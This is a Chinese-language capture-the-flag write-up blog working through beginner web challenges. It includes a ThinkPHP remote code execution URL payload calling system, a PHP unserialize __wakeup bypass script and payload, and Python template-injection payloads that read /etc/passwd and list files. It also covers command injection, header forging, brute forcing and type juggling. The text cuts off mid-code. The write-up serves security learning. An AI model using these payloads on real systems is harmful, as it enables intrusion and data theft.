<p><img src="https://img-blog.csdnimg.cn/20200313154943333.png" alt="在这里插入图片描述"></p>
<p>接着找哪里调用了module方法。</p>
<p><img src="https://img-blog.csdnimg.cn/20200313155003918.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>可以看到$result来自$dispatch[‘module’]接着找$dispatch</p>
<p><img src="https://img-blog.csdnimg.cn/20200313155033323.png" alt="在这里插入图片描述"></p>
<p>找到run这个方法</p>
<p><img src="https://img-blog.csdnimg.cn/20200313155051967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>以及这句</p>
<p>继续追踪routeCheck方法<br><img src="https://img-blog.csdnimg.cn/2020031315513396.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20200313155144837.png" alt="在这里插入图片描述"></p>
<p>到Route中可以发现解析URL并没有进行安全检测<br>从Request::path()追到request.php中的pathinfo()<br><img src="https://img-blog.csdnimg.cn/20200313155205282.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>var_pathinfo的默认配置为s,我们可以通过$_GET[‘s’]来传参<br>最后构造payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?s=index/\think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200313155417999.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200313155427598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><img src="https://img-blog.csdnimg.cn/20200313155435147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L21vY2h1Nzc3Nzc3Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="17-baby-web"><a href="#17-baby-web" class="headerlink" title="17.baby_web"></a>17.baby_web</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119193336259.png" alt="image-20221119193336259"></p>
<p>题目提示初始页面</p>
<p>我们访问初始页面</p>
<p>发现被重定向了</p>
<p>尝试burp抓包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119193457365.png" alt="image-20221119193457365"></p>
<p>查看一下hex</p>
<p>找到flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119193613420.png" alt="image-20221119193613420"></p>
<h2 id="18-Web-php-unserialize"><a href="#18-Web-php-unserialize" class="headerlink" title="18.Web_php_unserialize"></a>18.Web_php_unserialize</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119193748672.png" alt="image-20221119193748672"></p>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>])) &#123; </span><br><span class="line">    <span class="variable">$var</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;var&#x27;</span>]); </span><br><span class="line">    <span class="comment">//base64解码</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$var</span>)) &#123; </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     preg_match(’/[oc]:\d+:/i’, $var) 正则匹配的规则是: 在不区分大小写的情况下 ， 若字符串出现 “o:数字” 或者 &quot;c:数字’ 这样的格式 ， 那么就被过滤 .很明显 ， 因为 serialize() 的参数为 object ，因此参数类型肯定为对象 &quot; O &quot; ， 又因为序列化字符串的格式为 参数格式:参数名长度 ， 因此 &quot; O:4 &quot; 这样的字符串肯定无法通过正则匹配</span></span><br><span class="line"><span class="comment">     而O:+4没被过滤说明绕过了过滤而且最后的值不变。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;stop hacking!&#x27;</span>); </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$var</span>); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;index.php&quot;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>编写脚本</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> </span>&#123; </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span> = <span class="string">&#x27;index.php&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>) </span>&#123; </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;file = <span class="variable">$file</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;file, <span class="literal">true</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;file != <span class="string">&#x27;index.php&#x27;</span>) &#123; </span><br><span class="line">            <span class="comment">//the secret is in the fl4g.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;file = <span class="string">&#x27;index.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$A</span> = <span class="keyword">new</span> <span class="title class_">Demo</span> (<span class="string">&#x27;fl4g.php&#x27;</span>);					<span class="comment">//创建对象</span></span><br><span class="line"><span class="variable">$C</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$A</span>);                     <span class="comment">//对对象A进行序列化</span></span><br><span class="line"><span class="variable">$C</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;O:4&#x27;</span>,<span class="string">&#x27;O:+4&#x27;</span>,<span class="variable">$C</span>);      <span class="comment">//绕过正则表达式过滤</span></span><br><span class="line"><span class="variable">$C</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$C</span>); 		<span class="comment">//wakeup绕过</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$C</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$C</span>));            <span class="comment">//base64加密</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119202947255.png" alt="image-20221119202947255"></p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221119203024936.png" alt="image-20221119203024936"></p>
<h2 id="19-Web-python-template-injection"><a href="#19-Web-python-template-injection" class="headerlink" title="19.Web_python_template_injection"></a>19.Web_python_template_injection</h2><p>判断有无模板注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:53362/&#123;&#123;7+8&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221120110500590.png" alt="image-20221120110500590"></p>
<p>执行了语句，说明存在模板注入</p>
<p>查看全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://220.249.52.133:53362/&#123;&#123;config&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221120110758090.png" alt="image-20221120110758090"></p>
<p>文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。<br>思路：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">魔术方法：</span><br><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221120112248168.png" alt="image-20221120112248168"></p>
<p>找到file，文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; [].__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;</span><br></pre></td></tr></table></figure>

<p>找到Printer，命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>本题我们主要用到命令执行，直接利用上面的payload即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221120112424773.png" alt="image-20221120112424773"></p>
<p>找到flag</p>
<p>读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221120112513449.png" alt="image-20221120112513449"></p>
<h2 id="20-web2"><a href="#20-web2" class="headerlink" title="20.web2"></a>20.web2</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221121212356670.png" alt="image-20221121212356670"></p>
<p>代码审计</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$miwen</span>=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$_o</span>=<span class="title function_ invoke__">strrev</span>(<span class="variable">$str</span>);</span><br><span class="line">    <span class="comment">//strrev() 反转字符串函数</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_o</span>);<span class="variable">$_0</span>++)&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_o</span>,<span class="variable">$_0</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//字符串截取</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// ord() 函数以一个字符（长度为1的字符串）作为参数，返回对应的 ASCII 数值，或者 Unicode 数值</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);</span><br><span class="line">        <span class="comment">//chr（）函数是输入一个整数【0，255】返回其对应的ascii符号</span></span><br><span class="line">        </span><br><span class="line">        <span class="variable">$_</span>=<span class="variable">$_</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_rot13</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_</span>)));</span><br><span class="line">    <span class="comment">//str_rot13()函数是一个字符串函数，用于使用ROT13编码技术对字符串进行编码(或解码)。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   逆向加密算法，解密$miwen就是flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>写逆向代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&#x27;</span>;</span><br><span class="line"><span class="variable">$_</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">str_rot13</span>(<span class="variable">$str</span>)));</span><br><span class="line"></span><br><span class="line"><span class="variable">$_o</span>=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$_0</span>=<span class="number">0</span>;<span class="variable">$_0</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$_</span>);<span class="variable">$_0</span>++)&#123;  </span><br><span class="line">       </span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$_</span>,<span class="variable">$_0</span>,<span class="number">1</span>);  </span><br><span class="line"></span><br><span class="line">        <span class="variable">$__</span>=<span class="title function_ invoke__">ord</span>(<span class="variable">$_c</span>)-<span class="number">1</span>;  </span><br><span class="line"></span><br><span class="line">        <span class="variable">$_c</span>=<span class="title function_ invoke__">chr</span>(<span class="variable">$__</span>);  </span><br><span class="line"></span><br><span class="line">        <span class="variable">$_o</span>=<span class="variable">$_o</span>.<span class="variable">$_c</span>;   </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strrev</span>(<span class="variable">$_o</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221121220318609.png" alt="image-20221121220318609"></p>
<h2 id="21-simple-php"><a href="#21-simple-php" class="headerlink" title="21.simple_php"></a>21.simple_php</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221122201343142.png" alt="image-20221122201343142"></p>
<p>审计代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span>==<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$b</span>))&#123;  <span class="comment">//b为数字，则退出</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>&gt;<span class="number">1234</span>)&#123;  <span class="comment">//b要大于1234</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>php中字符串与数字比较是把字符串强转成数字：12345a-&gt;12345</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=0a&amp;b=12345a</span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221122202103716.png" alt="image-20221122202103716"></p>
<h2 id="22-command-execution"><a href="#22-command-execution" class="headerlink" title="22.command_execution"></a>22.command_execution</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201144931932.png" alt="image-20221201144931932"></p>
<p>题目提示没有写防火墙</p>
<p>WAF具备限制对某些URI请求次数的能力和限制文件上传功能的能力。</p>
<p>| 的作用为将前一个命令的结果传递给后一个命令作为输入</p>
<p>&amp;&amp;的作用是前一条命令执行成功时，才执行后一条命令</p>
<p>掌握有关命令执行的知识</p>
<p>windows 或 linux 下:</p>
<p>command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2</p>
<p>command1 | command2 只执行 command2</p>
<p>command1 &amp; command2 先执行 command2 后执行 command1</p>
<p>command1 || command2 先执行 command1，如果为假，再执行 command2</p>
<p>命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201150548923.png" alt="image-20221201150548923"></p>
<p>多次查找目录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201150758946.png" alt="image-20221201150758946"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201150902577.png" alt="image-20221201150902577"></p>
<h2 id="23-weak-auth"><a href="#23-weak-auth" class="headerlink" title="23.weak_auth"></a>23.weak_auth</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201151514084.png" alt="image-20221201151514084"></p>
<p>用户名随便输入</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201151543005.png" alt="image-20221201151543005"></p>
<p>提示使用admin登录</p>
<p>然后爆破密码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201151622444.png" alt="image-20221201151622444"></p>
<p>登录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201151649826.png" alt="image-20221201151649826"></p>
<h2 id="24-xff-referer"><a href="#24-xff-referer" class="headerlink" title="24.xff_referer"></a>24.xff_referer</h2><p>打卡</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201152512186.png" alt="image-20221201152512186"></p>
<p>进行伪造：</p>
<p>X-Forwarded-For: 123.123.123.123</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201152738910.png" alt="image-20221201152738910">继续伪造：</p>
<p>referer: <a target="_blank" rel="noopener" href="https://www.google.com/">https://www.google.com</a></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201152844468.png" alt="image-20221201152844468"></p>
<h2 id="25-simple-js"><a href="#25-simple-js" class="headerlink" title="25.simple_js"></a>25.simple_js</h2><p>打开</p>
<p>随便输入一个密码</p>
<p>啥也没有</p>
<p>查看源代码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20221201155637701.png" alt="image-20221201155637701"></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//split字符串分割成字符串数组</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//tab=[55,56,54,79,115,69,114,116,107,49,50]</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//tab2=[70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65]</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;i = <span class="number">0</span>;j = tab.<span class="property">length</span>;</span></span><br><span 